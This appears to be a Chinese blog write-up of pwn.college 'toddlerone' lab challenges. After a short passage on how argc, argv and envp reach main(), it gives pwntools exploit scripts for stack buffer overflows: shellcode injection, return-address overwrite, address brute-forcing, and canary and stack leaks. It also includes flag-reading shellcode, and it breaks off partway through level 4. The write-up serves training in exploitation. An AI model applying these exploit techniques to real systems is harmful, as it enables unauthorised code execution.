<p>当 <code>_start</code> 函数调用 <code>main()</code> 时，它会将 <code>argc</code>、<code>argv</code>、<code>envp</code> 的地址分别传递给 <code>main()</code> 函数的参数，这就是为什么 <code>main()</code> 能够接收到这些参数。</p>
<h4 id="7-程序开始执行"><a href="#7-程序开始执行" class="headerlink" title="7. 程序开始执行"></a>7. <strong>程序开始执行</strong></h4><p>这样，<code>main()</code> 函数中的 <code>argc</code>、<code>argv</code> 和 <code>envp</code> 就分别持有了命令行参数的数量、命令行参数的指针数组和环境变量的指针数组。程序员可以通过这些参数访问命令行传递给程序的信息以及程序的运行环境。</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
<li><code>argc</code>: 命令行参数的数量，由操作系统传递。</li>
<li><code>argv</code>: 指向命令行参数字符串的指针数组，每个元素都是一个指向某个命令行参数的指针。</li>
<li><code>envp</code>: 指向环境变量字符串的指针数组，每个元素都是一个指向某个环境变量的指针。</li>
</ul>
<p>这些参数是在程序启动时，由操作系统在堆栈上准备好，然后通过 <code>_start</code> 函数传递给 <code>main()</code> 函数的。</p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>没有开启canary，首先使用mmap创建一个内存空间读取shellcode，这个地址是确定的，所以后续只要直接跳转到这个地址就可以了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level1.0"</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level1.0"</span><span class="token punctuation">)</span>

raw_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level1/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
raw_file <span class="token operator">=</span> raw_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># file_bytes = len(raw_file)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>raw_file<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>raw_file<span class="token punctuation">)</span>

buffer_size <span class="token operator">=</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">8</span> 
padding_size <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">3</span>
rbp <span class="token operator">=</span> <span class="token number">8</span>
address_ <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1FF69000</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token punctuation">(</span>buffer_size <span class="token operator">+</span> padding_size <span class="token operator">+</span> rbp<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> address_
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token triple-quoted-string string">"""
BITS 64

section .data
    filename '/flag',0

section .bss
    buffer resb 50

section .text
global _start

_start:
    xor rax, rax
    mov rax, 2
    lea rdi, [rel filename]
    xor rsi, rsi
    syscall

    mov rdi, rax
    lea rsi, [rel buffer]
    mov rdx, 100
    xor rax, rax
    syscall

    mov rdi, 1
    mov rdx, rax
    mov rax, 1 
    syscall
 
"""</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>没有开启ASLR，没有开启canary。栈空间具有可执行权限。</p>
<p>将二进制代码写入栈中，然后覆盖返回地址为缓冲区起始地址即可。还是用的level1中的shellcode</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level2.0"</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level2.0"</span><span class="token punctuation">)</span>

raw_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level1/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
raw_file <span class="token operator">=</span> raw_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
file_bytes <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>raw_file<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>file_bytes<span class="token punctuation">)</span>

buffer_size <span class="token operator">=</span> <span class="token number">56</span>
padding_size <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token number">3</span>
rbp <span class="token operator">=</span> <span class="token number">8</span>
address_ <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x7fffffffce60</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> raw_file <span class="token operator">+</span> <span class="token punctuation">(</span>buffer_size <span class="token operator">+</span> padding_size <span class="token operator">+</span> rbp <span class="token operator">-</span> file_bytes<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> address_
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h3><p>这一关没有回显了，所以你不能通过回显来判断返回地址应该写成啥。</p>
<p>gdb调试的话，对应的栈空间是会发生变化的。因为gdb可能会添加一些栈帧进去。所以用gdb显示的地址也不行。</p>
<p>但是因为本题关闭了PIE，所以每次栈空间的基址是一样的。<br><code>   0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rwxp   [stack]</code></p>
<p>用gdb查看的话，返回地址应该是 <code>0x7fffffffcf28</code>。但是gdb返回的栈空间和实际运行的栈空间有差距。</p>
<p>我通过之前2.0的程序观察，单独运行程序，栈基址是 <code>0x7fffffffcf50</code>，运行gdb查看程序的话，栈基址是 <code>0x7fffffffcef0</code><br>差距不大。</p>
<p>所以我选择从 <code>0x7ffffffc000</code>开始爆破。最终正确的地址是 <code>0x7ffffffce20</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


raw_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level1/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
raw_file <span class="token operator">=</span> raw_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
file_bytes <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>raw_file<span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level2.1"</span><span class="token punctuation">)</span>

base_address <span class="token operator">=</span> <span class="token number">0x7fffffffc000</span>
<span class="token comment"># correct_addresss = 0x7fffffffce20</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level2.1"</span><span class="token punctuation">)</span>

    buffer_size <span class="token operator">=</span> <span class="token number">0x90</span>
    padding_size <span class="token operator">=</span> <span class="token number">0</span>
    rbp <span class="token operator">=</span> <span class="token number">8</span>
    address_ <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_address<span class="token punctuation">)</span>

    payload <span class="token operator">=</span> raw_file <span class="token operator">+</span> <span class="token punctuation">(</span>buffer_size <span class="token operator">+</span> padding_size <span class="token operator">+</span> rbp <span class="token operator">-</span> file_bytes<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> address_
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"160"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>address_<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    base_address <span class="token operator">+=</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>这个题开启了 <code>canary</code> 和 <code>PIE</code>保护。只能通过重复的缓冲区溢出，借助 <code>puts</code>的回显，获取canary的值和真正的栈空间的值。</p>
<p>首先challenge函数的栈空间是 <code>0x80</code>，在调用的过程中会 <code>push return_address</code> 和 <code>push rbp</code>所以这里又多了 <code>0x10</code>字节。我们可以通过 <code>REPEAT</code>重复调用 <code>challenge</code>获取 <code>canary_value</code>。再次使用 <code>REPEAT</code>，重复调用 <code>challenge</code>获取main函数调用 <code>challenge</code>时，challenge函数的栈基址。这样，我们在减去两个 <code>0x80+0x10</code>，就能获得第三次调用challenge函数时的栈基址。再减去 <code>0x40</code>就是要覆盖返回地址的栈空间的地址。shellcode就放在这里。</p>
<p>因为栈空间有限，所以我是用execve函数调用外部的c程序来打印flag的值。这样能节约shellcode的空间。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">
challenge_3:
    challenge_2函数的栈基址
    ret返回地址

chanllenge_2:
    challenge_1函数的栈基址-------<span class="token operator">></span>第二次重复调用challenge函数就是为了获取这个，然后减去2*0x90就是challenge_3函数的栈基址
    ret返回地址

chanllenge_1:
    mian函数的栈基址
    ret返回地址
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level3.0"</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level3.0"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>

init_payload_size <span class="token operator">=</span> <span class="token number">57</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


init_payload_size <span class="token operator">=</span> <span class="token number">57</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0x90</span> <span class="token operator">-</span> <span class="token number">0x90</span> <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span>

real_payload_size <span class="token operator">=</span> <span class="token number">56</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">56</span> <span class="token operator">-</span> shellcode_size<span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_address
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>



<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level3.1"</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level3.1"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>

init_payload_size <span class="token operator">=</span> <span class="token number">0x60</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xB0</span> <span class="token operator">-</span> <span class="token number">0xB0</span> <span class="token operator">-</span> <span class="token number">0x60</span><span class="token punctuation">)</span>

real_payload_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> shellcode_size<span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_address
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>这一关跟上一关的区别是，在你不传入REPEAT的情况下，他会检验一个8个字节的值，如果不对就调用exit。调用exit就不会再回到程序的执行流了，就直接退出了。所以你覆盖的返回地址就失效了。所以必须要在栈空间的构造中，填入这个值。<strong>注意数字0xbeef和真实的数据发送0xef 0xbe</strong>!</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">,</span> <span class="token string">"REPEAT"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Backdoor triggered! Repeating challenge()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">challenge</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Goodbye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This challenge will, by default, exit() instead of returning from the"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"challenge function. When a process exit()s, it ceases to exist immediately,"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"and no amount of overwritten return addresses will let you hijack its control"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"flow. You will have to reverse engineer the program to understand how to avoid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"making this challenge exit(), and allow it to return normally."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">!=</span> <span class="token number">0xF58B48D72EC7B457LL</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"exit() condition triggered. Exiting!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"exit() condition avoided! Continuing execution."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level4.1"</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level4.1"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>

init_payload_size <span class="token operator">=</span> <span class="token number">0x58</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
